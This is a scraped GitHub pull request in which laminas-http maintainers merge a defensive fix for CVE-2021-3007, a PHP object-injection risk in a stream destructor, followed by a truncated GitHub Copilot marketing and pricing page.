=== Content from github.com_d76a0362_20250115_200932.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flaminas%2Flaminas-http%2Fpull%2F48)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flaminas%2Flaminas-http%2Fpull%2F48)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=laminas%2Flaminas-http)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[laminas](/laminas)
/
**[laminas-http](/laminas/laminas-http)**
Public

* [Notifications](/login?return_to=%2Flaminas%2Flaminas-http) You must be signed in to change notification settings
* [Fork
  30](/login?return_to=%2Flaminas%2Flaminas-http)
* [Star
   36](/login?return_to=%2Flaminas%2Flaminas-http)

* [Code](/laminas/laminas-http)
* [Issues
  5](/laminas/laminas-http/issues)
* [Pull requests
  2](/laminas/laminas-http/pulls)
* [Actions](/laminas/laminas-http/actions)
* [Projects
  0](/laminas/laminas-http/projects)
* [Security](/laminas/laminas-http/security)
* [Insights](/laminas/laminas-http/pulse)

Additional navigation options

* [Code](/laminas/laminas-http)
* [Issues](/laminas/laminas-http/issues)
* [Pull requests](/laminas/laminas-http/pulls)
* [Actions](/laminas/laminas-http/actions)
* [Projects](/laminas/laminas-http/projects)
* [Security](/laminas/laminas-http/security)
* [Insights](/laminas/laminas-http/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Flaminas%2Flaminas-http%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Flaminas%2Flaminas-http%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Security tightening: verify a stream file name is a string before unlinking #48

 Merged

[weierophinney](/weierophinney)
merged 1 commit into
[laminas:2.14.x](/laminas/laminas-http/tree/2.14.x "laminas/laminas-http:2.14.x")
from
[weierophinney:security/stream-destruction](/weierophinney/laminas-http/tree/security/stream-destruction "weierophinney/laminas-http:security/stream-destruction")

Jan 5, 2021

 Merged

# [Security tightening: verify a stream file name is a string before unlinking](#top) #48

[weierophinney](/weierophinney)
merged 1 commit into
[laminas:2.14.x](/laminas/laminas-http/tree/2.14.x "laminas/laminas-http:2.14.x")
from
[weierophinney:security/stream-destruction](/weierophinney/laminas-http/tree/security/stream-destruction "weierophinney/laminas-http:security/stream-destruction")

Jan 5, 2021

[Conversation
1](/laminas/laminas-http/pull/48)
[Commits
1](/laminas/laminas-http/pull/48/commits)
[Checks
0](/laminas/laminas-http/pull/48/checks)
[Files changed](/laminas/laminas-http/pull/48/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![weierophinney](https://avatars.githubusercontent.com/u/25943?s=60&v=4)](/weierophinney)

Copy link

Member

### @weierophinney **[weierophinney](/weierophinney)** commented [Jan 5, 2021](#issue-779195886) • edited Loading

Per [CVE-2021-3007](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3007) (and as reported on [Bleeping Computer](https://www.bleepingcomputer.com/news/security/zend-framework-remote-code-execution-vulnerability-revealed/) there is a possibility **IF A USER HAS USED UNSERIALIZE() ON UNTRUSTED DATA** of the stream response destructor potentially invoking a class `__toString()` implementation, and thus triggering a vulnerability.

This patch ensures that given that scenario, the stream response destructor does not use an object as a string for purposes of unlinking a potential stream filename.

---

### Additional information

The Laminas security team was contacted on 2020-11-27 about a potential vulnerability in the MVC skeleton. After analysis, we responded on 2020-11-30 with the following:

```
On review, we feel this is not a vulnerability specific to the framework, but rather
more generally to the language. The un/serialize() functions have a long history
of vulnerabilities (please see https://www.google.com/search?q=php+unserialize+RCE
for examples), and developers should NEVER use it on untrusted input. If this is
impossible, they should at the very least pass the second `$options` argument,
and provide a list of allowed classes, or use the argument to disallow all
unserialization of objects (see https://www.php.net/unserialize for details).

We also received the report you provided against Zend Framework. That project
is no longer active, and any security issues are now resolved in the Laminas
Project (which will require users migrate to Laminas from ZF). Our findings remain
the same for that project, however; this is a PHP language issue, and not specific
to our project.

```

The Open Web Application Security Project (OWASP) has a classification for this sort of vulnerability: [PHP Object Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection). It is not specific to any given framework, and presents itself when an application blindly unserializes user input that includes classes with `__destruct()` methods and/or methods that might get called within the application context (including other magic methods such as `__toString()`). The same vulnerability could have been achieved even easier by providing a serialized class with a `__destruct()` method defined, as the method would be called as soon as the object was out of scope.

Regardless, we are providing this patch to help further protect our users from these scenarios. The patch provides type checking of the `$streamName` property before performing a cleanup operation (which results in an `unlink()` operation, which, previously, could have resulted in an implied call to an an object's `__toString()` method) in the `Laminas\Http\Response\Stream` destructor.

Sorry, something went wrong.

All reactions

[![@weierophinney](https://avatars.githubusercontent.com/u/25943?s=40&v=4)](/weierophinney)

`[fix: do not unlink file if it is not a file](/laminas/laminas-http/pull/48/commits/eab608e10896270416aae7ffce36cc48072aa796 "fix: do not unlink file if it is not a file

Per https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3007 there is a possibility IF A USER HAS USED UNSERIALIZE() ON UNTRUSTED DATA of the stream response destructor potentially invoking a class `__toString()` implementation, and thus triggering a vulnerability.

This patch ensures that given that scenario, the stream response destructor does not use an object as a string for purposes of unlinking a potential stream filename.

Signed-off-by: Matthew Weier O'Phinney <matthew@weierophinney.net>")`
 …

`[eab608e](/laminas/laminas-http/pull/48/commits/eab608e10896270416aae7ffce36cc48072aa796)`

```
Per <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3007> there is a possibility IF A USER HAS USED UNSERIALIZE() ON UNTRUSTED DATA of the stream response destructor potentially invoking a class `__toString()` implementation, and thus triggering a vulnerability.

This patch ensures that given that scenario, the stream response destructor does not use an object as a string for purposes of unlinking a potential stream filename.

Signed-off-by: Matthew Weier O'Phinney <matthew@weierophinney.net>
```

[![@weierophinney](https://avatars.githubusercontent.com/u/25943?s=40&u=b73a8899d61dca0e359ede434e4b35ef4c07a1e2&v=4)](/weierophinney)
[weierophinney](/weierophinney)
added
[Bug](/laminas/laminas-http/labels/Bug)
Something isn't working
[Enhancement](/laminas/laminas-http/labels/Enhancement)
labels
[Jan 5, 2021](#event-4170478563)

[![@weierophinney](https://avatars.githubusercontent.com/u/25943?s=40&u=b73a8899d61dca0e359ede434e4b35ef4c07a1e2&v=4)](/weierophinney)
[weierophinney](/weierophinney)
added this to the [2.14.2](/laminas/laminas-http/milestone/7) milestone
[Jan 5, 2021](#event-4170478898)

[![michalbundyra](https://avatars.githubusercontent.com/u/7423207?s=60&v=4)](/michalbundyra)

**[michalbundyra](/michalbundyra)**
approved these changes
[Jan 5, 2021](#pullrequestreview-561901209)

 [View reviewed changes](/laminas/laminas-http/pull/48/files/eab608e10896270416aae7ffce36cc48072aa796)

[![Ocramius](https://avatars.githubusercontent.com/u/154256?s=60&v=4)](/Ocramius)

**[Ocramius](/Ocramius)**
approved these changes
[Jan 5, 2021](#pullrequestreview-561917307)

 [View reviewed changes](/laminas/laminas-http/pull/48/files/eab608e10896270416aae7ffce36cc48072aa796)

Copy link

Member

### @Ocramius **[Ocramius](/Ocramius)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

LGTM. Also, since the upstream issue is not really a security issue with the library, I'd be fine with merging this for the next **minor**, rather than backporting.

Sorry, something went wrong.

 👍
1
 boesing reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

[![boesing](https://avatars.githubusercontent.com/u/2189546?s=60&v=4)](/boesing)

**[boesing](/boesing)**
approved these changes
[Jan 5, 2021](#pullrequestreview-561917496)

 [View reviewed changes](/laminas/laminas-http/pull/48/files/eab608e10896270416aae7ffce36cc48072aa796)

[![samsonasik](https://avatars.githubusercontent.com/u/459648?s=60&v=4)](/samsonasik)

**[samsonasik](/samsonasik)**
approved these changes
[Jan 5, 2021](#pullrequestreview-561919487)

 [View reviewed changes](/laminas/laminas-http/pull/48/files/eab608e10896270416aae7ffce36cc48072aa796)

[![@weierophinney](https://avatars.githubusercontent.com/u/25943?s=40&u=b73a8899d61dca0e359ede434e4b35ef4c07a1e2&v=4)](/weierophinney)
[weierophinney](/weierophinney)
merged commit [`019f31f`](/laminas/laminas-http/commit/019f31fe1c5449823e08ce98b0afd6835f5ffa32)
into
laminas:2.14.x

[Jan 5, 2021](https://github.com/laminas/laminas-http/pull/48#event-4170617753)

 [![@weierophinney](https://avatars.githubusercontent.com/u/25943?s=40&u=b73a8899d61dca0e359ede434e4b35ef4c07a1e2&v=4)](/weierophinney)
[weierophinney](/weierophinney)
deleted the
security/stream-destruction

branch
[January 5, 2021 16:08](#event-4170618169)

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)](/apps/github-actions)
[github-actions](/apps/github-actions)
bot
mentioned this pull request
[Jan 5, 2021](#ref-pullrequest-779233267)

[Merge release 2.14.2 into 2.15.x
#49](/laminas/laminas-http/pull/49)
 Merged

[![@glensc](https://avatars.githubusercontent.com/u/199095?s=40&v=4)](/glensc)
[glensc](/glensc)
mentioned this pull request
[Jan 6, 2021](#ref-pullrequest-780412578)

[[zend-http] Backport of fix for CVE-2021-3007 in Zend\_Http\_Response\_Stream
zf1s/zf1#43](/zf1s/zf1/pull/43)
 Merged

[xmorave2](/xmorave2)
added a commit
to moravianlibrary/CPK
that referenced
this pull request
[Jun 9, 2021](#ref-commit-72ec20e)
[![@xmorave2](https://avatars.githubusercontent.com/u/1775826?s=40&u=8f197e7c40f35e91d3123cfe2e179f904a3b213b&v=4)](/xmorave2)

`[Issue 269: Fix](/moravianlibrary/CPK/commit/72ec20edc2603f9aec9cae29c2bce31cf8701320 "Issue 269: Fix CVE-2021-3007

More information about fix: https://github.com/laminas/laminas-http/pull/48") [CVE-2021-3007](https://github.com/advisories/GHSA-xx8f-qf9f-5fgw "CVE-2021-3007")`
…

`[72ec20e](/moravianlibrary/CPK/commit/72ec20edc2603f9aec9cae29c2bce31cf8701320)`

```
More information about fix: [laminas/laminas-http#48](https://github.com/laminas/laminas-http/pull/48)
```

[![@berlinger-bartvermeulen](https://avatars.githubusercontent.com/u/91884760?s=40&v=4)](/berlinger-bartvermeulen)
[berlinger-bartvermeulen](/berlinger-bartvermeulen)
mentioned this pull request
[Jul 19, 2023](#ref-pullrequest-1811838067)

[[#185490281] - Add fix for CVE-2021-3007
berlinger-nl/zf1#1](/berlinger-nl/zf1/pull/1)
 Merged

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Flaminas%2Flaminas-http%2Fpull%2F48)

Reviewers

[![@michalbundyra](https://avatars.githubusercontent.com/u/7423207?s=40&v=4)](/michalbundyra) [michalbundyra](/michalbundyra)

michalbundyra approved these changes

[![@boesing](https://avatars.githubusercontent.com/u/2189546?s=40&v=4)](/boesing) [boesing](/boesing)

boesing approved these changes

[![@samsonasik](https://avatars.githubusercontent.com/u/459648?s=40&v=4)](/samsonasik) [samsonasik](/samsonasik)

samsonasik approved these changes

[![@Ocramius](https://avatars.githubusercontent.com/u/154256?s=40&v=4)](/Ocramius) [Ocramius](/Ocramius)

Ocramius approved these changes

Assignees

No one assigned

Labels

[Bug](/laminas/laminas-http/labels/Bug)
Something isn't working
[Enhancement](/laminas/laminas-http/labels/Enhancement)

Projects

None yet

Milestone

 [**2.14.2**](/laminas/laminas-http/milestone/7 "2.14.2")

Development

Successfully merging this pull request may close these issues.

5 participants

[![@weierophinney](https://avatars.githubusercontent.com/u/25943?s=52&v=4)](/weierophinney) [![@Ocramius](https://avatars.githubusercontent.com/u/154256?s=52&v=4)](/Ocramius) [![@samsonasik](https://avatars.githubusercontent.com/u/459648?s=52&v=4)](/samsonasik) [![@boesing](https://avatars.githubusercontent.com/u/2189546?s=52&v=4)](/boesing) [![@michalbundyra](https://avatars.githubusercontent.com/u/7423207?s=52&v=4)](/michalbundyra)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_dba769c8_20250115_200923.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffeatures%2Fcopilot)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffeatures%2Fcopilot)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Ffeatures%2Fcopilot&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[GitHub Copilot](/features/copilot)Navigation menu. Current page: Overview

* Overview
* [Plans](/features/copilot/plans)
* [Tutorials](/features/copilot/tutorials)
* [Extensions](/features/copilot/extensions)
* [What’s new](/features/copilot/whats-new)
![](https://github.githubassets.com/assets/hero-bg-sm-11153e2d28f8.jpg)GitHub Copilot is now available for free
# The AI editor for everyone

[Get started for free](https://github.com/copilot)[See plans & pricing](/features/copilot/plans?cft=copilot_lo.features_copilot)Already have ![](https://github.githubassets.com/assets/vscode-41ed661450e9.svg) Visual Studio Code? Open nowPause
## GitHub Copilot is used by

![Lyft](https://github.githubassets.com/assets/lyft-ff04a849adcd.svg)![FedEx](https://github.githubassets.com/assets/fedex-4fbd5209ba18.svg)![AT&T](https://github.githubassets.com/assets/atnt-a1d3c3d04a75.svg)![Shopify](https://github.githubassets.com/assets/shopify-c893630d6403.svg)![BMW](https://github.githubassets.com/assets/bmw-72cecc644c23.svg)![H&M](https://github.githubassets.com/assets/hnm-7f6d81c34913.svg)![Honeywell](https://github.githubassets.com/assets/honeywell-cbed470d5960.svg)![EY](https://github.githubassets.com/assets/ey-cd7494447821.svg)![Infosys](https://github.githubassets.com/assets/infosys-935e1fcdf87b.svg)![BBVA](https://github.githubassets.com/assets/bbva-538b46252b6e.svg)![Lyft](https://github.githubassets.com/assets/lyft-ff04a849adcd.svg)![FedEx](https://github.githubassets.com/assets/fedex-4fbd5209ba18.svg)![AT&T](https://github.githubassets.com/assets/atnt-a1d3c3d04a75.svg)![Shopify](https://github.githubassets.com/assets/shopify-c893630d6403.svg)![BMW](https://github.githubassets.com/assets/bmw-72cecc644c23.svg)![H&M](https://github.githubassets.com/assets/hnm-7f6d81c34913.svg)![Honeywell](https://github.githubassets.com/assets/honeywell-cbed470d5960.svg)![EY](https://github.githubassets.com/assets/ey-cd7494447821.svg)![Infosys](https://github.githubassets.com/assets/infosys-935e1fcdf87b.svg)![BBVA](https://github.githubassets.com/assets/bbva-538b46252b6e.svg)PauseFeatures
## Customizable. Contextual. AI-powerful.

PausePause

*Create tests, docs, and more.* Ask GitHub Copilot a question, get the right answer for you, and accept the code with a single click.[Our favorite Copilot prompts](https://docs.github.com/en/copilot/example-prompts-for-github-copilot-chat)

* *Answers that know how you code.* GitHub Copilot can use your code and Custom Instructions to code the way you prefer.
* *Create tests, docs, and more.* Ask GitHub Copilot to generate them and add them to your codebase with just one click.
### Choose your model

Use models like Anthropic's [Claude 3.5 Sonnet](https://docs.github.com/en/copilot/using-github-copilot/using-claude-sonnet-in-github-copilot), OpenAI o1, and GPT 4o to excel at coding tasks one minute — and deeper reasoning and understanding the next.

Pause
### Multi-file edits

Tell GitHub Copilot what to do, and watch it update multiple files right in your editor.

![GitHub Copilot including multiple files in a working set](https://github.githubassets.com/assets/copilot-multifile-3eb48ba0aedf.webp)
### Get AI-based suggestions in real time

GitHub Copilot suggests code completions as you type and turns natural language prompts into coding suggestions based on your project's conventions.

[Use slash commands](https://docs.github.com/en/copilot/using-github-copilot/asking-github-copilot-questions-in-your-ide#slash-commands)PausePause
### Instant feedback

Ask GitHub Copilot to review your work, uncover hidden bugs, fix mistakes, and more—before you get a human review.

[Get early access](https://github.com/features/preview/copilot-code-review)[![GitHub Copilot performing a code review](https://github.githubassets.com/assets/copilot-review-c1d2859ea8a2.webp)](https://github.com/features/preview/copilot-code-review)
### Extensions for your favorite tools

Check logs, create feature flags, and deploy apps—all from Copilot Chat, enhanced by an ecosystem of extensions from third party tools and services.

[Explore GitHub Copilot Extensions](https://github.com/features/copilot/extensions)[![GitHub Copilot Extensions for Azure, Datastax, Docker, MongoDB and Sentry](https://github.githubassets.com/assets/copilot-extensions-f78138bbfae2.webp)](https://github.com/features/copilot/extensions)
### Ask for assistance right in your terminal

[Try Copilot in the CLI](https://docs.github.com/copilot/using-github-copilot/using-github-copilot-in-the-command-line)![Screenshot of GitHub Copilot CLI in a terminal](https://github.githubassets.com/assets/copilot-terminal-3048272df3eb.webp)![Screenshot of GitHub Copilot CLI in a terminal](https://github.githubassets.com/assets/copilot-terminal-sm-d07a8373a1e6.webp)![](https://github.githubassets.com/assets/copilot-terminal-bg-826e922edd44.webp)
### Chat with your AI pair programmer on-the-go

[![Download GitHub on the Google Play Store](https://github.githubassets.com/assets/google-play-b4758bd0f618.png)](https://play.google.com/store/apps/details?id=com.github.android)[![Download GitHub on the Apple App Store](https://github.githubassets.com/assets/app-store-f73cb66283cf.png)](https://apps.apple.com/app/github/id1477376905?ls=1)![A phone showing GitHub Copilot in GitHub Mobile](https://github.githubassets.com/assets/copilot-mobile-828695350edc.webp)Pricing
## Take flight with GitHub Copilot

New
### Free

For developers looking to get started with GitHub Copilot.

$0 USD  [Get started](https://github.com/copilot)Already have ![](https://github.githubassets.com/assets/vscode-41ed661450e9.svg) VS Code? Open nowIncludes up to 2,000 completions and 50 chat requests per month.Most popular
### Pro

For developers who want unlimited access to GitHub Copilot.

$10 USD per month. First 30 days free.[Get started](/github-copilot/signup/copilot_individual?cft=copilot_lo.features_copilot.cfi)Free for verified students, teachers, and maintainers of popular open source projects. [Learn more](https://github.com/education)
### Business

For teams ready to accelerate their workflows with GitHub Copilot.

$19 USD per user / month[Get started](/github-copilot/purchase?priority=business&cft=copilot_lo.features_copilot.cfb)[Contact sales](/enterprise/contact?ref_cta=Contact+sales&ref_loc=pricing&ref_page=%2Ffeatures%2Fcopilot&scid=&utm_campaign=Copilot_feature_page_contact_sales_cta_utmroutercampaign&utm_medium=site&utm_source=github&cft=copilot_lo.features_copilot&utm_content=CopilotBusiness)
### Enterprise

For organizations seeking a fully customized GitHub Copilot experience.

$39 USD per user / month[Get started](/github-copilot/purchase?priority=enterprise&cft=copilot_lo.features_copilot.ce)[Contact sales](/enterprise/contact?ref_cta=Contact+sales&ref_loc=pricing&ref_page=%2Ffeatures%2Fcopilot&scid=&utm_campaign=Copilot_feature_page_contact_sales_cta_utmroutercampaign&utm_medium=site&utm_source=github&cft=copilot_lo.features_copilot&utm_content=CopilotEnterprise)GitHub Copilot is available on your favorite platforms:

* [![](https://github.githubassets.com/assets/github-dae1693fc0e0.svg?v=1)GitHub](https://github.com/copilot) GitHub
* [![](https://github.githubassets.com/assets/vscode-41ed661450e9.svg?v=1)VS Code](https://marketplace.visualstudio.com/items?itemName=GitHub.copilot) VS Code
* [![](https://github.githubassets.com/assets/visualstudio-7b2c255a778e.svg?v=1)Visual Studio](https://visualstudio.microsoft.com/github-copilot) Visual Studio
* [![](https://github.githubassets.com/assets/xcode-b8ad451a19a6.svg?v=1)Xcode](https://github.com/github/CopilotForXcode) Xcode
* [![](https://github.githubassets.com/assets/jetbrains-04b2b7606878.svg?v=1)JetBrains IDEs](https://plugins.jetbrains.com/plugin/17718-github-copilot)JetBrains IDEs
* [![](https://github.githubassets.com/assets/neovim-c63bac91528a.svg?v=1)Neovim](https://github.com/github/copilot.vim) Neovim
* [![](https://github.githubassets.com/assets/azure-e978ccb08351.svg?v=1)Azure Data Studio](https://learn.microsoft.com/en-us/azure-data-studio/extensions/github-copilot-extension-overview)Azure Data Studio
Compare featuresFeaturesFreeProBusinessEnterprisePricing$0$10 per month$19 per user / month$39 per user / monthChatChatMessages and interactions Free planUp to 50 per monthUp to 50 per monthPro planUnlimitedUnlimitedBusiness planUnlimitedUnlimitedEnterprise planUnlimitedUnlimitedAccess to OpenAI GPT-4o Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewAccess to Anthropic Claude 3.5 Sonnet Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewAccess to OpenAI o1 Free planNot includedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewAccess to OpenAI o1-mini Free planNot includedPro planIncludedBusiness planIncludedEnterprise planIncludedContext-aware coding support and explanations Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedDebugging and security remediation assistance Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedAccess to knowledge from top open source repositories Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedGenerate tests, docs, and more with slash commands Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewWeb search powered by Bing Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewExplain failed Actions jobs Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedAnswers about issues, PRs, discussions, files, commits, etc. Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewMulti-file editing in VS Code Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedCode completionCode completionReal-time code suggestions Free planUp to 2,000 per monthUp to 2,000 per monthPro planUnlimitedUnlimitedBusiness planUnlimitedUnlimitedEnterprise planUnlimitedUnlimitedComments to code Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedCustomizationCustomizationTailor chat conversations to your private codebase (unlimited repositories indexed) Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewUnlimited integrations with GitHub Copilot Extensions Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewBuild a private extension for internal tooling Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewPersonalize responses with custom instructions Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedAttach knowledge bases to chat for organizational context Free planNot includedPro planNot includedBusiness planNot includedEnterprise planIncludedFine-tuned models for code completion (coming soon as add-on) Free planNot includedPro planNot includedBusiness planNot includedEnterprise planIncludedSet coding guidelines for code review Free planNot includedPro planNot includedBusiness planNot includedEnterprise planIncludedAI-native experiencesAI-native experiencesInline chat and prompt suggestions Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedSlash commands and context variables Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedCommit message generation Free planIncludedPro planIncludedBusiness planIncludedEnterprise planIncludedSummaries for pull requests, issues, and discussions Free planNot includedPro planIncludedBusiness planIncludedEnterprise planIncludedPreviewCode feedback in VS Code Free planIncludedPro 